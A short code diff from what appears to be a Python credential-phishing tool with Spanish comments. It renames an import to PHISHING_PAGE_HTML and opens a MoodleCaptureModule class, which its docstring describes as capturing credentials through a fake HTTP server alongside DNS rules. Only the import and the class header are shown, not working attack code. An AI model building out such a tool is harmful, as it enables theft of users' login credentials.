@@ -6,7 +6,7 @@ import threading
 import socketserver
 import http.server
 import urllib.parse
-from modulos.config import _estado, _dns_reglas, IP_LOCAL, MOGAH_HTML
+from modulos.config import _estado, _dns_reglas, IP_LOCAL, PHISHING_PAGE_HTML
 
 class MoodleCaptureModule:
     """Módulo para captura de credenciales via servidor HTTP falso."""
